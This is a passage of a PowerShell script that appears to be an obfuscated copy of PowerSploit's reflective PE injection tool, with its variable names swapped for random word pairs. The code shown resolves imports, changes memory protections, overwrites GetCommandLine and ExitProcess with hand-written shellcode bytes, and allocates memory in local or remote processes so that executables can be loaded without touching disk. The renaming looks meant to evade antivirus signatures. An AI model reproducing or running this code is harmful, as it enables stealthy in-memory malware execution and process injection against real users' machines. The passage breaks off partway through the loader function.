						-and $BroodyDraggy.Name -eq 0 `
						-and $BroodyDraggy.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$DianeHaff = [IntPtr]::Zero
				$AverilColorin = (Add-SignedIntAsUnsigned ([Int64]$AmazuluGasking.PEHandle) ([Int64]$BroodyDraggy.Name))
				$CyperusBroth = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($AverilColorin)
				
				if ($CovenCurling -eq $true)
				{
					$DianeHaff = Import-DllInRemoteProcess -BragsFennecs $BragsFennecs -AverilColorin $AverilColorin
				}
				else
				{
					$DianeHaff = $CrinkleChapati.LoadLibrary.Invoke($CyperusBroth)
				}

				if (($DianeHaff -eq $null) -or ($DianeHaff -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $CyperusBroth"
				}
				
				#Get the first thunk, then loop through all of them
				[IntPtr]$CaloFugus = Add-SignedIntAsUnsigned ($AmazuluGasking.PEHandle) ($BroodyDraggy.FirstThunk)
				[IntPtr]$DeificAncient = Add-SignedIntAsUnsigned ($AmazuluGasking.PEHandle) ($BroodyDraggy.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$CanonicBlowoff = [System.Runtime.InteropServices.Marshal]::PtrToStructure($DeificAncient, [Type][IntPtr])
				
				while ($CanonicBlowoff -ne [IntPtr]::Zero)
				{
					$BabyHagia = ''
					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					#	and doing the comparison, just see if it is less than 0
					[IntPtr]$AfrasiaEfflate = [IntPtr]::Zero
					if([Int64]$CanonicBlowoff -lt 0)
					{
						$BabyHagia = [Int64]$CanonicBlowoff -band 0xffff #This is actually a lookup by ordinal
					}
					else
					{
						[IntPtr]$FriseBunkos = Add-SignedIntAsUnsigned ($AmazuluGasking.PEHandle) ($CanonicBlowoff)
						$FriseBunkos = Add-SignedIntAsUnsigned $FriseBunkos ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$BabyHagia = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FriseBunkos)
					}
					
					if ($CovenCurling -eq $true)
					{
						[IntPtr]$AfrasiaEfflate = Get-RemoteProcAddress -BragsFennecs $BragsFennecs -AvestaDroners $DianeHaff -ChrysinChuppas $BabyHagia
					}

					#https://github.com/PowerShellMafia/PowerSploit/issues/147
                    else
					{
						if($BabyHagia -is [string])
						{
						    [IntPtr]$AfrasiaEfflate = $CrinkleChapati.GetProcAddress.Invoke($DianeHaff, $BabyHagia)
						}
						else
						{
						    [IntPtr]$AfrasiaEfflate = $CrinkleChapati.GetProcAddressOrdinal.Invoke($DianeHaff, $BabyHagia)
						}
					}
					
					if ($AfrasiaEfflate -eq $null -or $AfrasiaEfflate -eq [IntPtr]::Zero)
					{
						Throw "New function reference is null, this is almost certainly a bug in this script. Function: $BabyHagia. Dll: $CyperusBroth"
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($AfrasiaEfflate, $CaloFugus, $false)
					
					$CaloFugus = Add-SignedIntAsUnsigned ([Int64]$CaloFugus) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$DeificAncient = Add-SignedIntAsUnsigned ([Int64]$DeificAncient) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$CanonicBlowoff = [System.Runtime.InteropServices.Marshal]::PtrToStructure($DeificAncient, [Type][IntPtr])
				}
				
				$ErogenyBodying = Add-SignedIntAsUnsigned ($ErogenyBodying) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$BetteBryce.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$EpicedeFair
		)
		
		$FilixCavy = 0x0
		if (($EpicedeFair -band $FunksGoric.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($EpicedeFair -band $FunksGoric.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($EpicedeFair -band $FunksGoric.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$FilixCavy = $FunksGoric.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$FilixCavy = $FunksGoric.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($EpicedeFair -band $FunksGoric.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$FilixCavy = $FunksGoric.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$FilixCavy = $FunksGoric.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($EpicedeFair -band $FunksGoric.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($EpicedeFair -band $FunksGoric.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$FilixCavy = $FunksGoric.PAGE_READWRITE
				}
				else
				{
					$FilixCavy = $FunksGoric.PAGE_READONLY
				}
			}
			else
			{
				if (($EpicedeFair -band $FunksGoric.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$FilixCavy = $FunksGoric.PAGE_WRITECOPY
				}
				else
				{
					$FilixCavy = $FunksGoric.PAGE_NOACCESS
				}
			}
		}
		
		if (($EpicedeFair -band $FunksGoric.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$FilixCavy = $FilixCavy -bor $FunksGoric.PAGE_NOCACHE
		}
		
		return $FilixCavy
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$AmazuluGasking,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$CrinkleChapati,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$FunksGoric,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$BetteBryce
		)
		
		for( $BopeepsGuessed = 0; $BopeepsGuessed -lt $AmazuluGasking.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $BopeepsGuessed++)
		{
			[IntPtr]$DronerHamadan = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$AmazuluGasking.SectionHeaderPtr) ($BopeepsGuessed * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$BetteBryce.IMAGE_SECTION_HEADER)))
			$CrossedGybe = [System.Runtime.InteropServices.Marshal]::PtrToStructure($DronerHamadan, [Type]$BetteBryce.IMAGE_SECTION_HEADER)
			[IntPtr]$AceroseDemo = Add-SignedIntAsUnsigned ($AmazuluGasking.PEHandle) ($CrossedGybe.VirtualAddress)
			
			[UInt32]$CorpBeaks = Get-VirtualProtectValue $CrossedGybe.Characteristics
			[UInt32]$BiggerCanoes = $CrossedGybe.VirtualSize
			
			[UInt32]$AcquestGoatee = 0
			Test-MemoryRangeValid -GaumishFrabbit "Update-MemoryProtectionFlags::VirtualProtect" -AmazuluGasking $AmazuluGasking -GloriaDivel $AceroseDemo -CotwistChoses $BiggerCanoes | Out-Null
			$FloodyBouton = $CrinkleChapati.VirtualProtect.Invoke($AceroseDemo, $BiggerCanoes, $CorpBeaks, [Ref]$AcquestGoatee)
			if ($FloodyBouton -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$AmazuluGasking,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$CrinkleChapati,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$FunksGoric,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$AnitherFoins,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$DenudedFaff
		)
		
		#This will be an array of arrays. The inner array will consist of: @($HaboobChunnia, $BabiestGrosso, $GawmCorks). This is used to return memory to its original state.
		$BulimyBabhan = @() 
		
		$BedungGrating = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$AcquestGoatee = 0
		
		[IntPtr]$CrotonGirded = $CrinkleChapati.GetModuleHandle.Invoke("Kernel32.dll")
		if ($CrotonGirded -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$AerifyGrumps = $CrinkleChapati.GetModuleHandle.Invoke("KernelBase.dll")
		if ($AerifyGrumps -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		#################################################
		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		$CrareCurfs = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($AnitherFoins)
		$AmishgoEnured = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($AnitherFoins)
	
		[IntPtr]$CristaeCabbala = $CrinkleChapati.GetProcAddress.Invoke($AerifyGrumps, "GetCommandLineA")
		[IntPtr]$DryableEpisode = $CrinkleChapati.GetProcAddress.Invoke($AerifyGrumps, "GetCommandLineW")

		if ($CristaeCabbala -eq [IntPtr]::Zero -or $DryableEpisode -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $CristaeCabbala. GetCommandLineW: $DryableEpisode"
		}

		#Prepare the shellcode
		[Byte[]]$AlmonryGrewia = @()
		if ($BedungGrating -eq 8)
		{
			$AlmonryGrewia += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$AlmonryGrewia += 0xb8
		
		[Byte[]]$AscareAzofy = @(0xc3)
		$ClautGadwall = $AlmonryGrewia.Length + $BedungGrating + $AscareAzofy.Length
		
		
		#Make copy of GetCommandLineA and GetCommandLineW
		$ExtrasBoodled = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ClautGadwall)
		$FreckBucked = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ClautGadwall)
		$CrinkleChapati.memcpy.Invoke($ExtrasBoodled, $CristaeCabbala, [UInt64]$ClautGadwall) | Out-Null
		$CrinkleChapati.memcpy.Invoke($FreckBucked, $DryableEpisode, [UInt64]$ClautGadwall) | Out-Null
		$BulimyBabhan += ,($CristaeCabbala, $ExtrasBoodled, $ClautGadwall)
		$BulimyBabhan += ,($DryableEpisode, $FreckBucked, $ClautGadwall)

		#Overwrite GetCommandLineA
		[UInt32]$AcquestGoatee = 0
		$FloodyBouton = $CrinkleChapati.VirtualProtect.Invoke($CristaeCabbala, [UInt32]$ClautGadwall, [UInt32]($FunksGoric.PAGE_EXECUTE_READWRITE), [Ref]$AcquestGoatee)
		if ($FloodyBouton = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$ChoosesCaver = $CristaeCabbala
		Write-BytesToMemory -BuffyGarbage $AlmonryGrewia -FinchedAronia $ChoosesCaver
		$ChoosesCaver = Add-SignedIntAsUnsigned $ChoosesCaver ($AlmonryGrewia.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($AmishgoEnured, $ChoosesCaver, $false)
		$ChoosesCaver = Add-SignedIntAsUnsigned $ChoosesCaver $BedungGrating
		Write-BytesToMemory -BuffyGarbage $AscareAzofy -FinchedAronia $ChoosesCaver
		
		$CrinkleChapati.VirtualProtect.Invoke($CristaeCabbala, [UInt32]$ClautGadwall, [UInt32]$AcquestGoatee, [Ref]$AcquestGoatee) | Out-Null
		
		
		#Overwrite GetCommandLineW
		[UInt32]$AcquestGoatee = 0
		$FloodyBouton = $CrinkleChapati.VirtualProtect.Invoke($DryableEpisode, [UInt32]$ClautGadwall, [UInt32]($FunksGoric.PAGE_EXECUTE_READWRITE), [Ref]$AcquestGoatee)
		if ($FloodyBouton = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$AurasBilayer = $DryableEpisode
		Write-BytesToMemory -BuffyGarbage $AlmonryGrewia -FinchedAronia $AurasBilayer
		$AurasBilayer = Add-SignedIntAsUnsigned $AurasBilayer ($AlmonryGrewia.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CrareCurfs, $AurasBilayer, $false)
		$AurasBilayer = Add-SignedIntAsUnsigned $AurasBilayer $BedungGrating
		Write-BytesToMemory -BuffyGarbage $AscareAzofy -FinchedAronia $AurasBilayer
		
		$CrinkleChapati.VirtualProtect.Invoke($DryableEpisode, [UInt32]$ClautGadwall, [UInt32]$AcquestGoatee, [Ref]$AcquestGoatee) | Out-Null
		#################################################
		
		
		#################################################
		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		$AnnuentAlannah = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($AdawnEthoxy in $AnnuentAlannah)
		{
			[IntPtr]$BuckleBucky = $CrinkleChapati.GetModuleHandle.Invoke($AdawnEthoxy)
			if ($BuckleBucky -ne [IntPtr]::Zero)
			{
				[IntPtr]$GrammyCycloid = $CrinkleChapati.GetProcAddress.Invoke($BuckleBucky, "_wcmdln")
				[IntPtr]$FogonDaylit = $CrinkleChapati.GetProcAddress.Invoke($BuckleBucky, "_acmdln")
				if ($GrammyCycloid -eq [IntPtr]::Zero -or $FogonDaylit -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$DotersDunnock = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($AnitherFoins)
				$CastethBoebera = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($AnitherFoins)
				
				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				$AutocarGyrose = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FogonDaylit, [Type][IntPtr])
				$DouraCivitan = [System.Runtime.InteropServices.Marshal]::PtrToStructure($GrammyCycloid, [Type][IntPtr])
				$BlendesCorbels = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BedungGrating)
				$AttidaeBeice = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BedungGrating)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($AutocarGyrose, $BlendesCorbels, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DouraCivitan, $AttidaeBeice, $false)
				$BulimyBabhan += ,($FogonDaylit, $BlendesCorbels, $BedungGrating)
				$BulimyBabhan += ,($GrammyCycloid, $AttidaeBeice, $BedungGrating)
				
				$FloodyBouton = $CrinkleChapati.VirtualProtect.Invoke($FogonDaylit, [UInt32]$BedungGrating, [UInt32]($FunksGoric.PAGE_EXECUTE_READWRITE), [Ref]$AcquestGoatee)
				if ($FloodyBouton = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DotersDunnock, $FogonDaylit, $false)
				$CrinkleChapati.VirtualProtect.Invoke($FogonDaylit, [UInt32]$BedungGrating, [UInt32]($AcquestGoatee), [Ref]$AcquestGoatee) | Out-Null
				
				$FloodyBouton = $CrinkleChapati.VirtualProtect.Invoke($GrammyCycloid, [UInt32]$BedungGrating, [UInt32]($FunksGoric.PAGE_EXECUTE_READWRITE), [Ref]$AcquestGoatee)
				if ($FloodyBouton = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($CastethBoebera, $GrammyCycloid, $false)
				$CrinkleChapati.VirtualProtect.Invoke($GrammyCycloid, [UInt32]$BedungGrating, [UInt32]($AcquestGoatee), [Ref]$AcquestGoatee) | Out-Null
			}
		}
		#################################################
		
		
		#################################################
		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		$BulimyBabhan = @()
		$EperuaClonus = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		#CorExitProcess (compiled in to visual studio c++)
		[IntPtr]$AwideCardiod = $CrinkleChapati.GetModuleHandle.Invoke("mscoree.dll")
		if ($AwideCardiod -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$BoarishEserine = $CrinkleChapati.GetProcAddress.Invoke($AwideCardiod, "CorExitProcess")
		if ($BoarishEserine -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$EperuaClonus += $BoarishEserine
		
		#ExitProcess (what non-managed programs use)
		[IntPtr]$ChaserFoister = $CrinkleChapati.GetProcAddress.Invoke($CrotonGirded, "ExitProcess")
		if ($ChaserFoister -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$EperuaClonus += $ChaserFoister
		
		[UInt32]$AcquestGoatee = 0
		foreach ($ForrideEphyra in $EperuaClonus)
		{
			$DotterAsss = $ForrideEphyra
			#The following is the shellcode (Shellcode: ExitThread.asm):
			#32bit shellcode
			[Byte[]]$AlmonryGrewia = @(0xbb)
			[Byte[]]$AscareAzofy = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			#64bit shellcode (Shellcode: ExitThread.asm)
			if ($BedungGrating -eq 8)
			{
				[Byte[]]$AlmonryGrewia = @(0x48, 0xbb)
				[Byte[]]$AscareAzofy = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$AppalFlehmen = @(0xff, 0xd3)
			$ClautGadwall = $AlmonryGrewia.Length + $BedungGrating + $AscareAzofy.Length + $BedungGrating + $AppalFlehmen.Length
			
			[IntPtr]$GermierAlcoa = $CrinkleChapati.GetProcAddress.Invoke($CrotonGirded, "ExitThread")
			if ($GermierAlcoa -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$FloodyBouton = $CrinkleChapati.VirtualProtect.Invoke($ForrideEphyra, [UInt32]$ClautGadwall, [UInt32]$FunksGoric.PAGE_EXECUTE_READWRITE, [Ref]$AcquestGoatee)
			if ($FloodyBouton -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			#Make copy of original ExitProcess bytes
			$AlkenylBionics = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ClautGadwall)
			$CrinkleChapati.memcpy.Invoke($AlkenylBionics, $ForrideEphyra, [UInt64]$ClautGadwall) | Out-Null
			$BulimyBabhan += ,($ForrideEphyra, $AlkenylBionics, $ClautGadwall)
			
			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			#	call ExitThread
			Write-BytesToMemory -BuffyGarbage $AlmonryGrewia -FinchedAronia $DotterAsss
			$DotterAsss = Add-SignedIntAsUnsigned $DotterAsss ($AlmonryGrewia.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($DenudedFaff, $DotterAsss, $false)
			$DotterAsss = Add-SignedIntAsUnsigned $DotterAsss $BedungGrating
			Write-BytesToMemory -BuffyGarbage $AscareAzofy -FinchedAronia $DotterAsss
			$DotterAsss = Add-SignedIntAsUnsigned $DotterAsss ($AscareAzofy.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($GermierAlcoa, $DotterAsss, $false)
			$DotterAsss = Add-SignedIntAsUnsigned $DotterAsss $BedungGrating
			Write-BytesToMemory -BuffyGarbage $AppalFlehmen -FinchedAronia $DotterAsss

			$CrinkleChapati.VirtualProtect.Invoke($ForrideEphyra, [UInt32]$ClautGadwall, [UInt32]$AcquestGoatee, [Ref]$AcquestGoatee) | Out-Null
		}
		#################################################

		Write-BespitGonial $BulimyBabhan
	}
	
	
	#This function takes an array of arrays, the inner array of format @($HaboobChunnia, $BabiestGrosso, $DumpsAcis)
	#	It copies Count bytes from Source to Destination.
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$AntimanAlkies,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$CrinkleChapati,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$FunksGoric
		)

		[UInt32]$AcquestGoatee = 0
		foreach ($ChimpsCanting in $AntimanAlkies)
		{
			$FloodyBouton = $CrinkleChapati.VirtualProtect.Invoke($ChimpsCanting[0], [UInt32]$ChimpsCanting[2], [UInt32]$FunksGoric.PAGE_EXECUTE_READWRITE, [Ref]$AcquestGoatee)
			if ($FloodyBouton -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$CrinkleChapati.memcpy.Invoke($ChimpsCanting[0], $ChimpsCanting[1], [UInt64]$ChimpsCanting[2]) | Out-Null
			
			$CrinkleChapati.VirtualProtect.Invoke($ChimpsCanting[0], [UInt32]$ChimpsCanting[2], [UInt32]$AcquestGoatee, [Ref]$AcquestGoatee) | Out-Null
		}
	}


	#####################################
	##########    FUNCTIONS   ###########
	#####################################
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$BlinDefoam,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$ChrysinChuppas
		)
		
		$BetteBryce = Get-GeoData
		$FunksGoric = Get-FunksGoric
		$AmazuluGasking = Get-PEDetailedInfo -BlinDefoam $BlinDefoam -BetteBryce $BetteBryce -FunksGoric $FunksGoric
		
		#Get the export table
		if ($AmazuluGasking.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$GalletaCoxed = Add-SignedIntAsUnsigned ($BlinDefoam) ($AmazuluGasking.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$CesuraCotylar = [System.Runtime.InteropServices.Marshal]::PtrToStructure($GalletaCoxed, [Type]$BetteBryce.IMAGE_EXPORT_DIRECTORY)
		
		for ($BopeepsGuessed = 0; $BopeepsGuessed -lt $CesuraCotylar.NumberOfNames; $BopeepsGuessed++)
		{
			#AddressOfNames is an array of pointers to strings of the names of the functions exported
			$DeafensBloats = Add-SignedIntAsUnsigned ($BlinDefoam) ($CesuraCotylar.AddressOfNames + ($BopeepsGuessed * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$BiteGyrally = Add-SignedIntAsUnsigned ($BlinDefoam) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($DeafensBloats, [Type][UInt32]))
			$CrenelsBatboys = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($BiteGyrally)

			if ($CrenelsBatboys -ceq $ChrysinChuppas)
			{
				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				#    which contains the offset of the function in to the DLL
				$CahniteAntlia = Add-SignedIntAsUnsigned ($BlinDefoam) ($CesuraCotylar.AddressOfNameOrdinals + ($BopeepsGuessed * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$CashboxDeface = [System.Runtime.InteropServices.Marshal]::PtrToStructure($CahniteAntlia, [Type][UInt16])
				$DrearlyAdulate = Add-SignedIntAsUnsigned ($BlinDefoam) ($CesuraCotylar.AddressOfFunctions + ($CashboxDeface * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$AretesAdult = [System.Runtime.InteropServices.Marshal]::PtrToStructure($DrearlyAdulate, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($BlinDefoam) ($AretesAdult)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$AnnieCapered,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$BobbishCharmed,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$BragsFennecs
		)
		
		$BedungGrating = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$FunksGoric = Get-FunksGoric
		$CrinkleChapati = Get-CrinkleChapati
		$BetteBryce = Get-GeoData
		
		$CovenCurling = $false
		if (($BragsFennecs -ne $null) -and ($BragsFennecs -ne [IntPtr]::Zero))
		{
			$CovenCurling = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$AmazuluGasking = Get-PEBasicInfo -AnnieCapered $AnnieCapered -BetteBryce $BetteBryce
		$ApsidesGuffaws = $AmazuluGasking.OriginalImageBase
		$BatelCircum = $true
		if (([Int] $AmazuluGasking.DllCharacteristics -band $FunksGoric.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $FunksGoric.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$BatelCircum = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$GuttlesCourant = $true
		if ($CovenCurling -eq $true)
		{
			$CrotonGirded = $CrinkleChapati.GetModuleHandle.Invoke("kernel32.dll")
			$CoelomFlukily = $CrinkleChapati.GetProcAddress.Invoke($CrotonGirded, "IsWow64Process")
			if ($CoelomFlukily -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$FryingAbsence = $false
			$FloodyBouton = $CrinkleChapati.IsWow64Process.Invoke($BragsFennecs, [Ref]$FryingAbsence)
			if ($FloodyBouton -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($FryingAbsence -eq $true) -or (($FryingAbsence -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$GuttlesCourant = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$EmbolumActable = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$EmbolumActable = $false
			}
			if ($EmbolumActable -ne $GuttlesCourant)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$GuttlesCourant = $false
			}
		}
		if ($GuttlesCourant -ne $AmazuluGasking.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
		[IntPtr]$AlgebarElastic = [IntPtr]::Zero
		if (([Int] $AmazuluGasking.DllCharacteristics -band $FunksGoric.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $FunksGoric.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
			[IntPtr]$AlgebarElastic = $ApsidesGuffaws
		}

		$BlinDefoam = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$AdanceAgag = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $BlinDefoam. If it is loaded in a remote process, this is the address in the remote process.
		if ($CovenCurling -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$BlinDefoam = $CrinkleChapati.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$AmazuluGasking.SizeOfImage, $FunksGoric.MEM_COMMIT -bor $FunksGoric.MEM_RESERVE, $FunksGoric.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
			$AdanceAgag = $CrinkleChapati.VirtualAllocEx.Invoke($BragsFennecs, $AlgebarElastic, [UIntPtr]$AmazuluGasking.SizeOfImage, $FunksGoric.MEM_COMMIT -bor $FunksGoric.MEM_RESERVE, $FunksGoric.PAGE_EXECUTE_READWRITE)
			if ($AdanceAgag -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($BatelCircum -eq $true)
			{
				$BlinDefoam = $CrinkleChapati.VirtualAlloc.Invoke($AlgebarElastic, [UIntPtr]$AmazuluGasking.SizeOfImage, $FunksGoric.MEM_COMMIT -bor $FunksGoric.MEM_RESERVE, $FunksGoric.PAGE_READWRITE)
			}
			else
			{
				$BlinDefoam = $CrinkleChapati.VirtualAlloc.Invoke($AlgebarElastic, [UIntPtr]$AmazuluGasking.SizeOfImage, $FunksGoric.MEM_COMMIT -bor $FunksGoric.MEM_RESERVE, $FunksGoric.PAGE_EXECUTE_READWRITE)
			}
			$AdanceAgag = $BlinDefoam
		}
		
		[IntPtr]$CowplopDatisi = Add-SignedIntAsUnsigned ($BlinDefoam) ([Int64]$AmazuluGasking.SizeOfImage)
		if ($BlinDefoam -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($AnnieCapered, 0, $BlinDefoam, $AmazuluGasking.SizeOfHeaders) | Out-Null
		
		
